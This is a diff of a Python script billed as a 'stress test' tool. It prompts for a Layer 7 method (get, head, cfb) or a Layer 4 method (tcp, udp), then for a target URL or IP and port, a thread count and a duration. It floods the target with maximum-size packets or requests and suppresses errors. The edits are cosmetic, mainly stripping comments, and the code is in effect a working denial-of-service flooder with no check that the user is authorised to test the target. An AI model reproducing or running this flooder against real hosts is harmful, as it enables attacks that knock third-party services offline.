@@ -5,35 +5,29 @@ import threading
 import time
 from colorama import Fore, Style, init
 
-# Initialize colorama
 init()
 
-# Set the protocol/method to use for sending requests
 print("Layer 7: get, head, cfb")
 print("Layer 4: tcp, udp")
-protocol = input("Enter the protocol/method to use: ")
+protocol = input("Enter the method to use: ")
 
 if protocol in ["get", "head", "cfb"]:
-    # Set the URL of the website to test
+    
     url = input("Enter the website URL (including http or https): ")
 elif protocol in ["tcp", "udp"]:
-    # Set the IP address and port of the server to test
+    
     ip = input("Enter the IP address of the server: ")
     port = int(input("Enter the port number: "))
-
-# Set the number of threads to use
+    
 num_threads = int(input("Enter the number of threads to use: "))
 
-# Set the duration of the stress test in seconds
 duration = int(input("Enter the duration of the stress test in seconds: "))
 
-# Set the packet size (in bytes)
 if protocol == "udp":
     packet_size = 65507 # Maximum size for a UDP packet
 elif protocol == "tcp":
     packet_size = 65535 # Maximum size for a TCP packet
-
-# Initialize packet counter and lock
+ 
 packet_counter = 0
 packet_counter_lock = threading.Lock()
 
@@ -51,7 +45,7 @@ def stress_test(thread_id):
         return
 
     start_time = time.time()
-    last_print_time = start_time
+    last_print_time = start_time - 9
     if thread_id == 0:
         if protocol in ["get", "head", "cfb"]:
             print(Fore.YELLOW + f"Stress testing started on {url} successfully!" + Style.RESET_ALL)
@@ -81,6 +75,7 @@ def stress_test(thread_id):
                     print(f"Sent {packet_counter} packets to {ip}:{port}")
                 last_print_time = time.time()
     if thread_id == 0:
+        time.sleep(0.5) # Add a 0.5 second delay
         print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
 
 def send_request(client):
@@ -101,18 +96,13 @@ def send_packet(sock):
         elif protocol == "udp":
             sock.sendto(b"X" * packet_size, (ip, port)) # Send a packet with maximum size
     except Exception as e:
-        pass # Suppress error messages
+        pass 
 
-# Create and start the threads
 threads = []
 for i in range(num_threads):
     thread = threading.Thread(target=stress_test, args=(i,))
     thread.start()
     threads.append(thread)
 
-# Wait for all threads to finish
 for thread in threads:
     thread.join()
-
-# Exit immediately after stress test has ended
-exit(0)
